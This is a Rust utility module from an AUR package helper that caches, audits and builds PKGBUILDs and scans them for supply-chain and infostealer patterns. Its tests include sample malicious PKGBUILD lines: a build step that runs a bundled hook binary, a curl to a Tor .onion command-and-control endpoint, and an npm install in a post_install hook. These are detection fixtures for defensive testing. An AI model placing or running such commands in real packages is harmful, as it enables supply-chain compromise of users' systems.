use anyhow::Result;
use diff::lines;
use std::fs;
use std::os::unix::process::ExitStatusExt;
use toml::Value;

#[cfg(feature = "cache")]
use crate::aur::SearchResult;

/// Caches and returns AUR search results for a query
#[cfg(feature = "cache")]
pub fn get_cached_search(query: &str) -> Option<Vec<SearchResult>> {
    cache::load_search(query)
}

#[cfg(feature = "cache")]
pub fn cache_search_result(query: &str, results: &[SearchResult]) {
    cache::save_search(query, results);
}

#[cfg(feature = "cache")]
#[allow(dead_code)]
pub async fn async_get_pkgbuild_cached(pkg: &str) -> String {
    // Try to load from file cache first
    if let Some(cached) = cache::load_pkgbuild(pkg) {
        return cached;
    }

    // If not cached, fetch from AUR
    let pkgb_preview = crate::aur::get_pkgbuild_preview(pkg);
    println!("[utils] PKGBUILD preview for {}:\n{}", pkg, pkgb_preview);
    for line in pkgb_preview.lines() {
        if line.trim_start().starts_with("pkgname=") {
            println!("[utils] Parsed pkgname for {}: {}", pkg, line.trim_start());
        }
    }
    if pkgb_preview.contains("pkgname") {
        println!("[utils] PKGBUILD for {} contains a pkgname field.", pkg);
    }

    // Save to cache
    cache::save_pkgbuild(pkg, &pkgb_preview);
    pkgb_preview
}

#[cfg(feature = "cache")]
pub fn ensure_cache_dirs() {
    let _ = std::fs::create_dir_all(&*cache::PKGBUILD_CACHE_DIR);
    let _ = std::fs::create_dir_all(&*cache::SEARCH_CACHE_DIR);
}

/// Audit a package by checking its source and dependencies
pub fn audit_package(pkg: &str) {
    let pkgb = crate::aur::get_pkgbuild_preview(pkg);
    if let Some((name, ver)) = parse_pkgname_ver(&pkgb) {
        println!("[preview] Package: {} v{}", name, ver);
    } else {
        println!("[preview] Could not parse PKGBUILD for '{}'", pkg);
    }
    println!("PKGBUILD preview:\n{}", pkgb);
    match crate::core::detect_source(pkg, None, false) {
        Some(crate::core::Source::Aur) => {
            println!("[AUDIT][AUR] Auditing PKGBUILD for {}...", pkg);
            let deps = crate::aur::get_deps(pkg);
            if deps.is_empty() {
                println!("[AUDIT][AUR] No dependencies found for {}.", pkg);
            } else {
                println!("[AUDIT][AUR] Dependencies for {}: {:?}", pkg, deps);
            }

            let install_hook = crate::aur::get_install_file_preview(pkg, &pkgb);
            let report = crate::audit::audit(&pkgb, &install_hook);
            if report.findings.is_empty() {
                println!("[AUDIT][AUR] No security findings for {}.", pkg);
            } else {
                println!("[AUDIT][AUR] Security findings for {}:", pkg);
                for finding in &report.findings {
                    println!("  {}", finding.describe());
                }
            }
            println!(
                "[AUDIT][AUR] Risk score: {} | infostealer confidence: {}",
                report.risk_score,
                report.infostealer_confidence.label()
            );
            if report.is_infostealer_block() {
                println!(
                    "[AUDIT][AUR] ⛔ Would be BLOCKED on install by default (override: --insecure)"
                );
            }
        }
        Some(crate::core::Source::Flatpak) => {
            println!("[AUDIT][FLATPAK] flatpak info {}:", pkg);
            let output = std::process::Command::new("flatpak")
                .arg("info")
                .arg(pkg)
                .output();
            if let Ok(out) = output {
                println!("{}", String::from_utf8_lossy(&out.stdout));
            } else {
                println!("[AUDIT][FLATPAK] Could not get info for {}.", pkg);
            }
        }
        _ => println!("[AUDIT] Unknown package source for {}.", pkg),
    }
}

#[allow(dead_code)]
type PkgMeta = (
    Vec<String>,
    Vec<String>,
    Vec<String>,
    Vec<String>,
    Vec<String>,
);

/// Parse PKGBUILD for depends, makedepends, conflicts and check system state
#[allow(dead_code)]
pub fn resolve_deps(pkgb: &str) -> PkgMeta {
    let mut depends = Vec::new();
    let mut makedepends = Vec::new();
    let mut conflicts = Vec::new();
    let mut missing = Vec::new();
    let mut conflicting = Vec::new();
    for line in pkgb.lines() {
        let trimmed = line.trim_start();
        if trimmed.starts_with("depends=") {
            let dep_line = trimmed.split_once('=').map(|x| x.1).unwrap_or("").trim();
            depends.extend(
                dep_line
                    .trim_matches(&['(', ')', '"', '\'', ' '] as &[_])
                    .split_whitespace()
                    .map(|s| s.trim_matches(&['"', '\'', ' '] as &[_]))
                    .filter(|s| !s.is_empty())
                    .map(|s| s.to_string()),
            );
        } else if trimmed.starts_with("makedepends=") {
            let dep_line = trimmed.split_once('=').map(|x| x.1).unwrap_or("").trim();
            makedepends.extend(
                dep_line
                    .trim_matches(&['(', ')', '"', '\'', ' '] as &[_])
                    .split_whitespace()
                    .map(|s| s.trim_matches(&['"', '\'', ' '] as &[_]))
                    .filter(|s| !s.is_empty())
                    .map(|s| s.to_string()),
            );
        } else if trimmed.starts_with("conflicts=") {
            let dep_line = trimmed.split_once('=').map(|x| x.1).unwrap_or("").trim();
            conflicts.extend(
                dep_line
                    .trim_matches(&['(', ')', '"', '\'', ' '] as &[_])
                    .split_whitespace()
                    .map(|s| s.trim_matches(&['"', '\'', ' '] as &[_]))
                    .filter(|s| !s.is_empty())
                    .map(|s| s.to_string()),
            );
        }
    }
    // Check installed packages
    let installed: Vec<String> = {
        let output = std::process::Command::new("pacman").arg("-Q").output();
        if let Ok(out) = output {
            String::from_utf8_lossy(&out.stdout)
                .lines()
                .map(|l| l.split_whitespace().next().unwrap_or("").to_string())
                .collect()
        } else {
            Vec::new()
        }
    };
    for dep in depends.iter().chain(makedepends.iter()) {
        if !installed.contains(dep) {
            missing.push(dep.clone());
        }
    }
    for c in &conflicts {
        if installed.contains(c) {
            conflicting.push(c.clone());
        }
    }
    (depends, makedepends, conflicts, missing, conflicting)
}

// --- CLI stub functions for compatibility ---
#[allow(dead_code)]
pub fn pkgb_diff_audit(package: &str, pkgb: &str) {
    let backup_path = crate::paths::backup_dir().join(format!("{}_PKGBUILD.bak", package));
    if let Ok(old_pkgb) = fs::read_to_string(&backup_path) {
        for diff in lines(&old_pkgb, pkgb) {
            match diff {
                diff::Result::Left(l) => println!("[-] {}", l),
                diff::Result::Right(r) => println!("[+] {}", r),
                diff::Result::Both(_, _) => {}
            }
        }
    } else {
        println!("[reap] No previous PKGBUILD backup found for {}.", package);
    }
}

#[cfg(feature = "cache")]
#[allow(dead_code)]
pub fn compare_pkgbuilds(pkg: &str, new_pkgb: &str) {
    let backup_path = crate::paths::backup_dir().join(pkg).join("PKGBUILD.bak");
    if let Ok(old_pkgb) = fs::read_to_string(&backup_path) {
        println!("[reap][diff] Diff for {}:", pkg);
        for diff in lines(&old_pkgb, new_pkgb) {
            match diff {
                diff::Result::Left(l) => println!("- {}", l),
                diff::Result::Right(r) => println!("+ {}", r),
                diff::Result::Both(l, _) => println!("  {}", l),
            }
        }
    } else {
        println!(
            "[reap][diff] No previous PKGBUILD backup found for {}.",
            pkg
        );
    }
}

pub fn completion(shell: &str) {
    // Shell completion is not yet fully implemented.
    // This stub acknowledges the request but doesn't provide working completions.
    println!(
        "[reap] Shell completion for '{}' is not yet implemented.",
        shell
    );
    println!();
    println!("For now, you can use basic command completion by adding to your shell config:");
    println!();
    match shell {
        "bash" => println!("  # Add to ~/.bashrc - provides basic command completion"),
        "zsh" => println!("  # Add to ~/.zshrc - provides basic command completion"),
        "fish" => println!("  # Add to ~/.config/fish/config.fish"),
        _ => {}
    }
    println!();
    println!("Full completion support is planned for a future release.");
}

pub async fn check_keyserver_async(keyserver: &str) {
    let output = tokio::process::Command::new("gpg")
        .args(["--keyserver", keyserver, "--list-keys"])
        .output()
        .await
        .map_err(|e| {
            eprintln!("[reap] keyserver check failed: {}", e);
            e
        })
        .unwrap_or_else(|e| {
            eprintln!("[reap] keyserver check failed: {}", e);
            std::process::Output {
                status: std::process::ExitStatus::from_raw(1),
                stdout: Vec::new(),
                stderr: Vec::new(),
            }
        });
    if output.status.success() {
        println!("[reap] GPG keyserver {} is reachable.", keyserver);
    } else {
        println!("[reap] GPG keyserver {} is NOT reachable.", keyserver);
    }
}

pub fn pin_package(pkg: &str) -> Result<(), String> {
    use std::fs::OpenOptions;
    use std::io::Write;
    let config_path = crate::paths::pinned_file();
    let mut file = OpenOptions::new()
        .create(true)
        .append(true)
        .open(&config_path)
        .map_err(|e| format!("Failed to open pinned.toml: {}", e))?;
    writeln!(file, "{}", pkg).map_err(|e| format!("Failed to write: {}", e))?;
    Ok(())
}

pub fn is_pinned(pkg: &str) -> bool {
    let config_path = crate::paths::pinned_file();
    if let Ok(contents) = fs::read_to_string(&config_path) {
        if let Ok(toml) = contents.parse::<Value>()
            && let Some(table) = toml.as_table()
        {
            return table.contains_key(pkg);
        }
        // Fallback: check for simple line pin
        contents.lines().any(|line| line.trim() == pkg)
    } else {
        false
    }
}

#[cfg(feature = "cache")]
#[allow(dead_code)]
pub fn pinned_version(pkg: &str) -> Option<String> {
    let config_path = crate::paths::pinned_file();
    if let Ok(contents) = fs::read_to_string(&config_path)
        && let Ok(toml) = contents.parse::<Value>()
        && let Some(table) = toml.as_table()
        && let Some(Value::String(ver)) = table.get(pkg)
    {
        return Some(ver.clone());
    }
    None
}

/// Clean the cache directories used by reap
pub fn clean_cache() -> Result<String, String> {
    #[cfg(feature = "cache")]
    {
        ensure_cache_dirs(); // Ensure cache dirs exist before cleaning
        cache::expire_cache();
    }

    let cache_dirs = vec![
        std::path::PathBuf::from("/tmp/reap"),
        crate::paths::CACHE_DIR.clone(),
    ];
    let mut deleted = 0;
    for path in &cache_dirs {
        if path.exists() && path.is_dir() {
            for entry in fs::read_dir(path)
                .map_err(|e| format!("Failed to read {}: {}", path.display(), e))?
            {
                let entry = entry.map_err(|e| format!("Read dir error: {}", e))?;
                let p = entry.path();
                if p.is_file() {
                    fs::remove_file(&p).map_err(|e| {
                        eprintln!("[reap] Failed to remove {}: {}", p.display(), e);
                        e.to_string()
                    })?;
                    deleted += 1;
                }
            }
        }
    }
    if deleted > 0 {
        Ok(format!("Cleaned {} cache files.", deleted))
    } else {
        Ok("Nothing to clean.".to_string())
    }
}

pub fn doctor_report() -> Result<String, String> {
    let mut issues = Vec::new();
    // Check for broken symlinks in /usr/bin/reap-*
    if let Ok(entries) = fs::read_dir("/usr/bin") {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Some(name) = path.file_name().and_then(|n| n.to_str())
                && name.starts_with("reap-")
                && path.is_symlink()
                && let Ok(target) = fs::read_link(&path)
                && !target.exists()
            {
                issues.push(format!(
                    "Broken symlink: {} -> {}",
                    path.display(),
                    target.display()
                ));
            }
        }
    }
    // Check for missing config files
    let config_dir = crate::paths::CONFIG_DIR.clone();
    if !config_dir.exists() {
        issues.push(format!("Missing config dir: {}", config_dir.display()));
    }
    let required = ["pinned.toml"];
    for f in &required {
        let fpath = config_dir.join(f);
        if !fpath.exists() {
            issues.push(format!("Missing config file: {}", fpath.display()));
        }
    }
    if issues.is_empty() {
        Ok("System appears healthy".to_string())
    } else {
        Ok(format!("Issues found:\n{}", issues.join("\n")))
    }
}

#[allow(dead_code)]
pub fn build_pkg(pkgdir: &std::path::Path, edit: bool) -> Result<(), String> {
    use std::env;
    use std::process::Command;
    let pkgb_path = pkgdir.join("PKGBUILD");
    if edit {
        let editor = env::var("EDITOR").unwrap_or_else(|_| "nano".to_string());
        let status = Command::new(editor).arg(&pkgb_path).status();
        if let Ok(s) = status {
            if !s.success() {
                return Err(format!("[reap] Editor exited with status: {}", s));
            }
        } else {
            return Err("[reap] Failed to launch editor".to_string());
        }
    }
    // Use makepkg_flags from config instead of hardcoded values
    let config = crate::config::Config::load();
    let mut cmd = Command::new("makepkg");
    for flag in &config.build.makepkg_flags {
        cmd.arg(flag);
    }
    cmd.arg("-i"); // Always add install flag

    let output = cmd.current_dir(pkgdir).output();
    match output {
        Ok(out) => {
            if out.status.success() {
                println!(
                    "[reap] makepkg succeeded:\n{}",
                    String::from_utf8_lossy(&out.stdout)
                );
                Ok(())
            } else {
                eprintln!(
                    "[reap] makepkg failed:\n{}",
                    String::from_utf8_lossy(&out.stderr)
                );
                Err(format!("[reap] makepkg failed with status: {}", out.status))
            }
        }
        Err(e) => Err(format!("[reap] Failed to run makepkg: {}", e)),
    }
}

pub fn backup_config() -> Result<(), String> {
    use std::fs;
    let config_dir = crate::paths::CONFIG_DIR.clone();
    let backup_dir = crate::paths::backup_dir().join("config");
    if !config_dir.exists() {
        return Err(format!(
            "[reap] Config dir not found: {}",
            config_dir.display()
        ));
    }
    if let Err(e) = fs::create_dir_all(&backup_dir) {
        return Err(format!("[reap] Failed to create backup dir: {}", e));
    }
    let options = fs_extra::dir::CopyOptions::new()
        .overwrite(true)
        .content_only(false);
    match fs_extra::dir::copy(&config_dir, &backup_dir, &options) {
        Ok(_) => {
            println!("[reap] Backed up config to {}", backup_dir.display());
            Ok(())
        }
        Err(e) => Err(format!("[reap] Failed to backup config: {}", e)),
    }
}

#[cfg(feature = "cache")]
pub mod cache {
    use crate::aur::SearchResult;
    use once_cell::sync::Lazy;
    use std::fs;
    use std::path::PathBuf;
    use std::time::{Duration, SystemTime};

    pub static PKGBUILD_CACHE_DIR: Lazy<PathBuf> = Lazy::new(crate::paths::pkgbuild_cache_dir);

    pub static SEARCH_CACHE_DIR: Lazy<PathBuf> = Lazy::new(crate::paths::search_cache_dir);

    pub fn save_pkgbuild(pkg: &str, content: &str) {
        let path = PKGBUILD_CACHE_DIR.join(format!("{}.PKGBUILD", pkg));
        let _ = fs::create_dir_all(PKGBUILD_CACHE_DIR.as_path());
        let _ = fs::write(path, content);
    }

    pub fn load_pkgbuild(pkg: &str) -> Option<String> {
        let path = PKGBUILD_CACHE_DIR.join(format!("{}.PKGBUILD", pkg));
        if let Ok(meta) = fs::metadata(&path)
            && let Ok(modified) = meta.modified()
            && SystemTime::now()
                .duration_since(modified)
                .unwrap_or(Duration::from_secs(0))
                < Duration::from_secs(60 * 60 * 24)
        {
            return fs::read_to_string(&path).ok();
        }
        None
    }

    pub fn expire_cache() {
        let _ = fs::remove_dir_all(PKGBUILD_CACHE_DIR.as_path());
        let _ = fs::remove_dir_all(SEARCH_CACHE_DIR.as_path());
    }

    pub fn save_search(query: &str, results: &[SearchResult]) {
        let path = SEARCH_CACHE_DIR.join(format!("{}.json", query));
        let _ = fs::create_dir_all(SEARCH_CACHE_DIR.as_path());
        let _ = fs::write(path, serde_json::to_string(results).unwrap_or_default());
    }

    pub fn load_search(query: &str) -> Option<Vec<SearchResult>> {
        let path = SEARCH_CACHE_DIR.join(format!("{}.json", query));
        if let Ok(meta) = fs::metadata(&path)
            && let Ok(modified) = meta.modified()
            && SystemTime::now()
                .duration_since(modified)
                .unwrap_or(Duration::from_secs(0))
                < Duration::from_secs(60 * 60 * 24)
            && let Ok(data) = fs::read_to_string(&path)
        {
            return serde_json::from_str(&data).ok();
        }
        None
    }
}

/// Flat-string compatibility shim over the unified [`crate::audit`] engine.
///
/// Detection logic (risky patterns, the Atomic-Arch supply-chain techniques,
/// suspicious domains, credential and infostealer heuristics) lives in
/// `src/audit.rs`. This wrapper preserves the historical `(warnings, score)`
/// return shape for existing callers.
pub fn audit_pkgbuild_findings(pkgbuild: &str) -> (Vec<String>, i32) {
    let report = crate::audit::audit(pkgbuild, "");
    (report.warnings(), report.risk_score)
}

/// Audit a PKGBUILD for risky patterns
#[allow(dead_code)]
pub fn audit_pkgbuild(pkgbuild: &str) -> (Vec<String>, i32) {
    let (warnings, risk_score) = audit_pkgbuild_findings(pkgbuild);

    if warnings.is_empty() {
        println!("✅ PKGBUILD security scan: No obvious security issues found");
    } else {
        println!(
            "⚠️ PKGBUILD security scan found {} potential issues:",
            warnings.len()
        );
        for warning in &warnings {
            println!("  {}", warning);
        }
    }

    let security_level = match risk_score {
        0..=5 => "LOW",
        6..=15 => "MEDIUM",
        16..=30 => "HIGH",
        _ => "CRITICAL",
    };

    println!(
        "🛡️ Security Risk Score: {} ({})",
        risk_score, security_level
    );

    (warnings, risk_score)
}

#[allow(dead_code)] // Retained for future use
pub fn rollback(pkg: &str) {
    use std::fs;

    // Use correct XDG-compliant backup path
    let backup_dir = crate::paths::backup_dir().join(pkg);

    // Find latest backup timestamp directory
    let entries: Vec<_> = fs::read_dir(&backup_dir)
        .ok()
        .map(|rd| rd.filter_map(|e| e.ok()).collect())
        .unwrap_or_default();

    let latest = entries
        .iter()
        .filter(|e| e.path().is_dir())
        .max_by_key(|e| e.file_name());

    match latest {
        Some(backup) => {
            println!(
                "[reap][rollback] Found backup at {}",
                backup.path().display()
            );
            // Check for PKGBUILD backup
            let pkgbuild_bak = backup.path().join("PKGBUILD");
            if pkgbuild_bak.exists() {
                println!("[reap][rollback] PKGBUILD backup available for rebuild");
            }
            // Check for binary backup
            let bin_backup = backup.path().join(pkg);
            if bin_backup.exists() {
                println!(
                    "[reap][rollback] Binary backup available at {}",
                    bin_backup.display()
                );
            }
        }
        None => {
            eprintln!(
                "[reap][rollback] No backup found for {} in {}",
                pkg,
                backup_dir.display()
            );
        }
    }

    // Clean up temp build directory
    let tmp_dir = std::env::temp_dir().join(format!("reap-aur-{}", pkg));
    if tmp_dir.exists() {
        let _ = fs::remove_dir_all(&tmp_dir);
        println!("[reap][rollback] Cleaned up temp dir for {}.", pkg);
    }
}

pub fn parse_pkgname_ver(content: &str) -> Option<(String, String)> {
    let mut name = None;
    let mut ver = None;
    for line in content.lines() {
        if line.starts_with("pkgname=") {
            name = Some(line.trim_start_matches("pkgname=").trim().to_string());
        } else if line.starts_with("pkgver=") {
            ver = Some(line.trim_start_matches("pkgver=").trim().to_string());
        }
    }
    match (name, ver) {
        (Some(n), Some(v)) => Some((n, v)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_pkgbuild_has_no_supply_chain_findings() {
        let pkgbuild = r#"
            pkgname=hello
            pkgver=1.0
            build() { make; }
            package() { make DESTDIR="$pkgdir" install; }
        "#;
        let (warnings, _) = audit_pkgbuild(pkgbuild);
        assert!(
            !warnings.iter().any(|w| w.contains("SUPPLY-CHAIN")),
            "clean PKGBUILD should not raise supply-chain warnings"
        );
    }

    #[test]
    fn detects_bundled_hook_and_onion_c2() {
        // Mirrors the Atomic Arch technique: a bundled binary under src/hooks
        // executed during build, plus a Tor C2 endpoint.
        let pkgbuild = r#"
            pkgname=trusted-orphan
            build() {
                ./src/hooks/deps
                curl http://olrh4mibs62l6kkuvvjyc5lrercqg5tz543r4lsw3o6mh5qb7g7sneid.onion/api/agent
            }
        "#;
        let (warnings, risk_score) = audit_pkgbuild(pkgbuild);
        assert!(warnings.iter().any(|w| w.contains("src/hooks/")));
        assert!(warnings.iter().any(|w| w.contains(".onion")));
        assert!(risk_score >= 17, "score was {risk_score}");
    }

    #[test]
    fn detects_npm_lifecycle_hook() {
        let install_hook = r#"
            post_install() {
                npm install atomic-lockfile@1.4.2
            }
        "#;
        let (warnings, _) = audit_pkgbuild(install_hook);
        assert!(warnings.iter().any(|w| w.contains("npm install")));
    }
}
